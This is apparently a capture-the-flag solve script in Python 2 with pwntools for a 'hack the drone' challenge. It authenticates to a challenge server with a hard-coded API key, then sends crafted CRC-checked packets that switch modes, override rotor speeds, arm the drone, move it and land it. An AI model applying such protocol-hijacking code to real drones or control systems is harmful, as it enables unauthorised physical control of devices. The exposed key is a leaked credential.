import base64
import binascii
import json

from pwn import *

p = remote('hackthedrone.eatpwnnosleep.com', 31234)

a = {
    'apikey' : 'aaca14463ad73872670c933a647bdf62c249d378ef8fc3b713129f08e38c3f33',
}

p.send(json.dumps(a))


def float_to_int(f):
    return struct.unpack('<I', struct.pack('<f', f))[0]


def next_line(n=1):
    try:
        l = []
        for _ in range(n):
            l.append(p.recvline().strip())
        return '\n'.join(map(lambda x: binascii.unhexlify(x), l))
    except Exception:
        print l
        exit(1)


def next_msg():
    l = []
    while True:
        s = p.recv(timeout=1.5)
        if s == '':
            break
        l += s.split()
    return '\n'.join(map(lambda x: binascii.unhexlify(x), l))


def send(data):
    data = p16(uid) + data
    payload = p32(len(data) + 8) + data
    payload += p32(0xFFFFFFFF & binascii.crc32(payload))
    p.sendline(binascii.hexlify(payload))

p.recvuntil('verifed.\n')
print next_line()

uid = 0

send('\x00'*8)
uid = int(next_line()[-5:])

log.success('drone uid: %d' % uid)

# 4626 - help
# 12336 - current_location
# 16448 - control_rotor
# 26214 - change_altitude
# 30840 - moveto
# 65278 - change_mode

# calibration mode
send(p16(65278) + p16(2))
print next_line(4)

# change rotor speed
send(p16(16448) + p8(17) + p16(0))
print next_line(3)
send(p16(16448) + p8(17) + p16(0xffff))
print next_line(4)
send(p16(16448) + p8(18) + p16(0))
print next_line(3)
send(p16(16448) + p8(18) + p16(0xffff))
print next_line(4)
send(p16(16448) + p8(19) + p16(0))
print next_line(3)
send(p16(16448) + p8(19) + p16(0xffff))
print next_line(4)
send(p16(16448) + p8(20) + p16(0))
print next_line(3)
send(p16(16448) + p8(20) + p16(0xffff))
print next_line(4)

print next_line()

# armed mode
send(p16(65278) + p16(1))
print next_line(3)

# change_altitude
# float_to_hex here: https://gregstoll.dyndns.org/~gregstoll/floattohex/
send(p16(26214) + p32(float_to_int(1000)))
print next_line(3)

# current_location
for i in range(6):
    send(p16(12336))
    print next_line(6)


# moveto
def moveto(x, y):
    send(p16(30840) + p32(float_to_int(x)) + p32(float_to_int(y)))
    s = next_line(3)
    print s

    wait_time = int(s[s.index('may take ')+9:s.index('s, use')])

    g = log.progress('Waiting')
    for i in range(wait_time):
        g.status('%d / %d' % (i+1, wait_time))
        send(p16(12336))
        next_line(6)
    g.success('Complete')

moveto(4, 50)
moveto(4, 16)
moveto(25, 16)

print next_line(2)

# land drone
send(p16(26214) + p32(float_to_int(0)))
print next_line(3)

# current_location
for i in range(6):
    send(p16(12336))
    print next_line(6)

print next_line()
